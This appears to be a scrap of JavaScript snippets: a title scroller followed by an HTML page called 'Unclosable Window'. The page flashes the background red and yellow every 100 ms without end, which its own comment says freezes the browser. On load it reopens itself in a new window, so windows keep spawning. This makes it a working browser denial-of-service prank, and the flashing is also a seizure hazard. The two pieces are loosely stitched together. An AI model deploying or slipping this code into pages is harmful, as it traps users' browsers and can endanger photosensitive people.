function changeText() {
 document.getElementById("textChange").innerHTML="Thanks for liking my Webpage";
}

var space = " ";
var pos = 0;
var msg = "User 06";

function Scroll(){
document.title = msg.substring(pos, msg.length) + space +msg.substring(0,pos);

pos++;
if (pos > msg.length) pos = 0;
window.setTimeout("Scroll()", 0);
}
Scroll();

<html>
<head>
<title>Unclosable Window</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="copyright" content="JavaScriptBank.com" />
<script language=JavaScript>
/*
Source of MainPart: Stefan MÃ¼nz, Selfhtml 7.0, tecb.htm
*/

activ = window.setInterval("Farbe()",100);
i = 0, farbe = 1;
function Farbe() {

if(farbe==1) {
document.bgColor="FFFF00"; farbe=2; }
else {
document.bgColor="FF0000"; farbe=1; }
i = i + 1;

//if you don't want to freeze the browser uncommend the next two lines
//if(i >= 50)
//window.clearInterval(activ);
}

function erneut(){
window.open(self.location,'');
}
window.onload = erneut;
</script>
</head>
<body>
<h1>Unclosable Window</h1>
</body>
</html>